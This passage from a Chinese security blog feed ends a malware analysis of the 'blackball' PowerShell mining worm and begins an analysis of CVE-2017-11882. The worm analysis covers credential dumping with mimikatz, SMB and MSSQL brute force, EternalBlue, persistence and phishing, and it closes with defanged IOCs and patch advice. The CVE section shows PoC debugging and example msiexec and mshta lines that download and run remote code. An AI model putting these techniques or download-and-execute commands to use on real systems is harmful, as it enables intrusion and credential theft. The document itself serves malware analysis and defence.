src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/source4.png" alt="source4"></p><p>首先，通过SC.exe关闭不必要的服务，再通过schtasks.exe删除不必要的计划任务，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/schtasks.png" alt="schtasks"></p><p>再通过WMi监控进程，根据进程的命令行参数和进程名，找出其他挖矿程序，结束对应进程，并将其文件删除，如图：</p><p>根据命令行参数，判断是否含有其他挖矿程序：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Get-Process.png" alt="Get-Process"></p><p>根据进程名判断是否含有其他挖矿程序，并且当Taskmgr.exe进程不存在时，便创建该进程：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Miner.png" alt="Miner"></p><p>同时还会监控建立TCP连接的端口是否为指定的值，当为指定值，也会将其进程结束。同样是为了清除其他挖矿进程，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/tcpconn.png" alt="tcpconn"></p><h3 id="使用PowerDump和Mimikatz获取感染主机的用户名密码"><a href="#使用PowerDump和Mimikatz获取感染主机的用户名密码" class="headerlink" title="使用PowerDump和Mimikatz获取感染主机的用户名密码"></a>使用PowerDump和Mimikatz获取感染主机的用户名密码</h3><p>通过网上开源的代码powerdump获取当前计算机所有用户秘密的hash值，并且还通过mimikatz获取到当前计算机所有用户的密码，当病毒作者的密码hash字典或密码字典中没有这些值时，便将其添加到字典中，如图: </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/dictory.png" alt="dictory"></p><p>用户名、密码hash及密码字典如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/userpassword.png" alt="userpassword"></p><h3 id="SMB爆破、永恒之蓝及SMBv3漏洞利用"><a href="#SMB爆破、永恒之蓝及SMBv3漏洞利用" class="headerlink" title="SMB爆破、永恒之蓝及SMBv3漏洞利用"></a>SMB爆破、永恒之蓝及SMBv3漏洞利用</h3><h4 id="构造目标主机IP"><a href="#构造目标主机IP" class="headerlink" title="构造目标主机IP"></a>构造目标主机IP</h4><p>获取主机所能访问到的内网地址，并且还通过访问网址http[:]//api.ipify.org获取公网IP，并且随机化一个公网IP网段。然后将这些获取到的网段地址和0~255的主机号进行拼接，生成后续要进行爆破或漏洞利用的IP地址，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/api_ipify.png" alt="api_ipify"></p><p>根据获取到的IP网段进行端口扫描，查看该网段内哪些主机开放了445端口以及作为感染标记的65529端口，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//65529.png" alt="65529"></p><p>当扫描到开放445端口，并且没有开放65529端口的主机，视为目标主机，将依次进行如下攻击：</p><h4 id="SMB弱口令爆破"><a href="#SMB弱口令爆破" class="headerlink" title="SMB弱口令爆破"></a>SMB弱口令爆破</h4><p>通过弱口令对开放445端口的主机进行SMB爆破，来实现横向传播，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//445SMB.png" alt="445SMB"></p><p>当爆破成功，便下载执行7p.php来绕过UAC，然后再将run.bat文件释放到目标主机的自启动目录下，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//7p.php.png" alt="7p.php"></p><h4 id="永恒之蓝（MS17-010）漏洞利用"><a href="#永恒之蓝（MS17-010）漏洞利用" class="headerlink" title="永恒之蓝（MS17-010）漏洞利用"></a>永恒之蓝（MS17-010）漏洞利用</h4><p>首先扫描目标主机是否存在永恒之蓝的漏洞，当检查到存在该漏洞时，便执行指定的Exp。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/MS17-010.png" alt="MS17-010"></p><h4 id="SMB-v3（CVE-2020-0796）漏洞扫描"><a href="#SMB-v3（CVE-2020-0796）漏洞扫描" class="headerlink" title="SMB v3（CVE-2020-0796）漏洞扫描"></a>SMB v3（CVE-2020-0796）漏洞扫描</h4><p>验证当前主机是否存在CVE-2020-0796漏洞，并将存在漏洞的主机信息，发送到服务器上。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/CVE-2020-0796.png" alt="CVE-2020-0796"></p><h3 id="MS-SQL-Server-管理员账户暴力破解"><a href="#MS-SQL-Server-管理员账户暴力破解" class="headerlink" title="MS-SQL Server 管理员账户暴力破解"></a>MS-SQL Server 管理员账户暴力破解</h3><p>先扫描当前网段哪些主机开放了1433端口和感染标记端口65529，当扫描到目标主机开放了1433端口并且没有开放65529端口，便对目标主机的SA账户进行爆破，当爆破成功便执行指令继续从服务器http[:]//t.tr2q.com上下载执行ms.jsp，来进行横向传播。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//%E6%A8%AA%E5%90%91%E4%BC%A0%E6%92%AD.png" alt="横向传播"></p><p>最后再将执行的结果，返回到服务器/log.json上，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/log.json.png" alt="log.json"></p><h2 id="创建计划任务实现持久化"><a href="#创建计划任务实现持久化" class="headerlink" title="创建计划任务实现持久化"></a>创建计划任务实现持久化</h2><p>从http[:]//t.tr2q.com下载执行report.jsp文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/report.jsp.png" alt="report.jsp"></p><p>report.jsp依旧是经过多轮混淆的Powershell指令，其主要功能为创建计划任务来实现持久化。首先创建名为“blackball”的计划任务，该计划任务不实现任何功能代码，只是作为感染标记。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/blackball.png" alt="blackball"></p><p>在根据下图的三个域名，创建三个随机命名的计划任务。这些计划任务除域名不同外，内容基本一致。都是通过调用PowerShell来执行下载执行a.jsp。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/a.jsp.png" alt="a.jsp"></p><p>经验证，计划任务下载的文件a.jsp与整体框架x.jsp是一致的，因此计划任务的目的便是实现持久化。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/md5.png" alt="md5"></p><h2 id="构造钓鱼邮件实施传播"><a href="#构造钓鱼邮件实施传播" class="headerlink" title="构造钓鱼邮件实施传播"></a>构造钓鱼邮件实施传播</h2><p>检测godmali3.txt是否存在，当文件不存在时下载if_mail.bin. </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/mail.png" alt="mail"></p><p>字符串形式保存要执行的第一段C#代码，用于突破会话隔离创建CMD进程</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/createCMD.png" alt="createCMD"></p><p>枚举当前会话ID</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/WTSEnumeratesessuions.png" alt="WTSEnumeratesessuions"></p><p>创建CMD进程，突破Session 0隔离</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Seeion_0.png" alt="Seeion_0"></p><p>第二段要执行的C#代码，用于邮件发送</p><p>首先解出使用Base64加密的脚本字符串</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/base64.png" alt="base64"></p><p>该部分主要用于生成发送邮件的附件，附件包括a.rtf和1.js两个文件</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//127.0.0.1.png" alt="127.0.0.1"></p><p>通过两段数据拼接的形式生成a.rtf</p><p>仔细分析后发现此文档包含CVE-2017-8570漏洞，当未修复此漏洞的主机打开后会触发隐含的脚本文件4i8IDlz75m1dp3c.sct，下载恶意代码执行。并实现脚本的自删除，清除痕迹。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/a.rtf.png" alt="a.rtf"></p><p>1.js采用社会工程学手段，将要执行的代码隐藏在最低端。使用记事本打开文本并静默执行powershell代码。可以让用户误以为是无意义的文本文件而实现代码执行</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//1.js.png" alt="1.js"></p><p>随后会进行邮件的构造</p><p>从邮件池中取出邮件的主题内容等</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/scrt_1.js.png" alt="scrt_1.js"></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/cmdstr.png" alt="cmdstr"></p><p>通过新冠肺炎等热门话题或诱导性文字引导用户打开附件</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/covid-19.png" alt="covid-19"></p><p>获取联系人信息并发送生成的钓鱼邮件。此前生成的RTF文件和JS脚本经处理后作为附件被添加，分别命名为readme.doc, readme.zip。</p><p>用户一旦打开附件就会成为新的受害者和不知情的传播者，如不能及时阻断将会通过钓鱼邮件的方式持续传播。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/sending_mail.png" alt="sending_mail"></p><h1 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h1><p><strong>安装如下补丁，防止漏洞利用：</strong></p><p>CVE-2017-8464 LNK 远程代码执行漏洞补丁</p><p>MS17-010永恒之蓝漏洞补丁</p><p>CVE-2020-0796 SMB v3远程代码执行漏洞补丁</p><p>CVE-2017-8570 office远程代码执行漏洞补丁</p><p><strong>设置复杂度较高的密码，杜绝同一密码多次使用，防止弱口令爆破和撞库：</strong></p><p>数据库管理员账户密码</p><p>Windows账户</p><p><strong>杜绝访问来源不明的邮件和使用不明的可移动设备</strong></p><h1 id="产品改进建议"><a href="#产品改进建议" class="headerlink" title="产品改进建议"></a>产品改进建议</h1><p>对 PowerShell 进程命令行参数进行过滤，维护命令行规则库，对危险操作进行拦截。</p><p>通过 Hook Invoke-Expression 函数的方式实现对混淆命令行参数的识别，对最终执行的</p><p>Powershell 指令进行规则匹配。</p><p>加强对 PowerShell 高风险行为的监控。</p><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><p><strong>IOC：</strong></p><p>http[:]//t.tr2q.com</p><p>http[:]//d.ackng.com</p><p>http[:]//t.awcna.com</p><p>http[:]//t.amynx.com</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>此次PowerShell样本可灵活地从服务器端获取更新的配置文件，结合各种黑客工具和漏洞利用模块，通过多种途径实现传播，给用户带来了极大的安全威胁。在此建议用户仔细检查邮件来源信息，不要被钓鱼信息迷惑。做好安全检查，不开放危险的端口，及时更新安全补丁。合理配置密码，不使用弱口令，避免遭遇弱口令爆破攻击。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 挖矿 </tag>
            
            <tag> 永恒之蓝 </tag>
            
            <tag> SMBGhost </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882漏洞分析及复现</title>
      <link href="2020/04/10/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/"/>
      <url>2020/04/10/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/</url>
      
        <content type="html"><![CDATA[<p><font size = 8><b>CVE-2017-11882漏洞分析及复现</b></font></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><strong>漏洞简介</strong></h2><p><code>CVE-2017-11882</code>漏洞属于缓冲区溢出类型的漏洞，攻击者可利用此漏洞实现任意代码执行，并且隐蔽性极高。该漏洞通杀目前被广泛使用的<strong>Office 2003到2016的所有版本</strong>。漏洞产生原因是由于<code>EQNEDT32.EXE</code>(Office自带的公式编辑器)进程在读入包含MathType的ole数据时，再拷贝公式名称（Font Name 数据）时没有对名称长度进行校验，从而导致缓冲区溢出，最终通过覆盖其函数的返回地址，实现任意代码执行的。</p><h2 id="分析POC"><a href="#分析POC" class="headerlink" title="分析POC"></a><strong>分析POC</strong></h2><p><strong>环境及工具</strong></p><blockquote><ul><li>系统环境 Win7 x32、Office 2013</li><li>工具 OD、IDA </li></ul></blockquote><h3 id="验证POC"><a href="#验证POC" class="headerlink" title="验证POC"></a><strong>验证POC</strong></h3><p>首先获取POC，网上关于CVE-2017-1182的POC有很多，可见：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882%E3%80%82">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882。</a></p><p>其中笔者下载的POC链接为：<a href="https://github.com/embedi/CVE-2017-11882%E3%80%82">https://github.com/embedi/CVE-2017-11882。</a></p><p>直接双击运行带有漏洞利用的**.rtf**文件，在打开.rtf文件的同时计算器进程也随之启动，如图1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200313171200202.png" alt="图1"></p><p>用<strong>Process Monitor</strong>可以看到计算器进程是由<strong>EQNEDT32.EXE</strong>（公式编辑器）调用cmd执行命令<code>cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAAC</code>来启用的，并且从公式编辑器的调用栈中，可以看到进程创建是由函数<code>WinExec</code>发起的，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200313172243599.png" alt="图2"></p><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a><strong>漏洞定位</strong></h3><p>附加调试程序<strong>EQNEDT32.EXE</strong>，在函数<code>WinExec</code>处下断，然后运行POC文件。当程序断下来时，查看栈信息，可知函数<code>WinExec</code>调用是来自<code>430C12</code>处，如图3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200316185756297.png" alt="图3"></p><p>再在地址<code>430C12</code>下断点，并重新运行POC。当程序再次断下来时，可知地址<code>430C12</code>处是<code>Call WinExec</code>的指令，并观察栈帧，发现ESP+4的值正是当前<code>Eip</code>指向的地址<code>430C12</code>，然后再往栈的上方看，发现大量0x41（A）的垃圾指令。通过数据窗口跟随这些指令，就会发现这些垃圾指令正是<strong>图2</strong>中捕获的指令，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200316191748853.png" alt="图4"></p><p>由上图中的垃圾指令以及垃圾指令后面的（ESP+4）处的当前EIP可推断出，这是栈溢出覆盖返回地址的操作导致的。那么便在栈地址<code>12F1D0</code>处下硬件写入断点（看是在哪覆盖的返回地址）。再次运行POC，经过多次断下并运行后（硬件断点下在栈中会触发很多次中断），最终程序将在<code>411658</code>处将返回地址修改为了<code>430C12</code>（如下图5），便可知发生栈溢出的地址是<code>411658</code>处。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200317112847049.png" alt="图5"></p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a><strong>漏洞原理分析</strong></h2><h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a><strong>栈溢出原理</strong></h3><p>通过调试知道了引发栈溢出的地址为<code>41165A</code>，用IDA去该地址处静态分析漏洞产生的原因。在<strong>EQNEDT32.EXE</strong>地址<code>41165A</code>处，发现漏洞产生的原因是因为在进行字符串拷贝操作时，没有对要拷贝的字符串进行长度判断，从而导致了栈溢出，如图6：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200317114714944.png" alt="图6"></p><p>那么这个要拷贝的数据是来自哪里呢？经过众多大神的分析，要拷贝的数据正是 oleObject 对象<strong>Equation Native</strong>中的==Font Name==字符串。那么我们现在就来查看下 <strong>POC</strong> 的 ==Font Name== 是什么样的。 </p><p>首先从<code>.rtf</code>文件中取出 oleObject 对象</p><p>现在可通过<strong>oletools</strong>工具中的<strong>rtfobj</strong>取出POC的<strong>Equation Native</strong> ole对象，命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtfobj -s all  &lt;exploit.rtf&gt;</span><br></pre></td></tr></table></figure><p>执行完如图下的命令后，便会将 <strong>oleObject</strong> 文件保存到文档所在目录下，如图7：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200409230121857.png" alt="图7"></p><p>然后可以通过工具 OffView 查看从 <code>.rtf</code> 文件中提取出来的 <strong>oleObject</strong> 对象，查看<code>Root Entry\Equation Navitve</code>下的 <strong>data</strong> 字段，就能看到==要拷贝的字符串数据==（正是图2抓取到的打开计算器的指令），如图8：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200425234203153.png" alt="图8"></p><p>因此当公式编辑器进程运行到地址<code>41165A</code>处，拷贝这段字符串数据时，由于长度过长从而导致了栈溢出，并且精准的覆盖了函数返回地址，使其跳转到设计好的地址去执行，本 POC 中跳转到地址<code>430C12</code>执行函数<code>WinExec</code>，来调用计算器。</p><h3 id="覆盖返回地址的具体操作"><a href="#覆盖返回地址的具体操作" class="headerlink" title="覆盖返回地址的具体操作"></a><strong>覆盖返回地址的具体操作</strong></h3><p>首先，复习一下正常的函数调用过程。函数调用会先将当前函数所需参数从右往左依次压进栈，然后再将返回地址和上一层栈的ebp压进栈中。然后剩下的就是当前函数临时变量所需的栈数据。可见下图覆盖前：<br>从前面分析的可知，CVE-2017-11882是由于没有对<code>strcpy</code>要拷贝的字符串的长度进行判断，从而导致在向栈区临时变量buffer拷贝时，当被拷贝的数据达到一定长度时，便能覆盖函数返回地址，从而当函数执行到返回时，便会跳转到被覆盖后的地址去执行（本例中将函数返回地址覆盖为<code>WinExec</code>的地址来执行打开计算器的命令的）</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200530140801077.png" alt="image-20200530140801077"></p><h4 id="两种不同利用方式"><a href="#两种不同利用方式" class="headerlink" title="两种不同利用方式"></a><strong>两种不同利用方式</strong></h4><p><strong>针对CVE-2017-11882有两种不同的覆盖函数返回地址的方式</strong></p><p>第一种就是该POC的模式，通过将返回地址覆盖为<code>Call WinExec</code>的地址，然后当执行到返回时，便会跳转到WinExec去执行。并且此时的==esp正指向要拷贝的字符串==，可以根据需求执行命令。比如</p><ul><li>可以使用msiexec下载PE文件 msiexec /q /i <a href="http://example.com/filename.msi">http://example.com/filename.msi</a></li><li>mshta来实现远程脚本执行 mshta <a 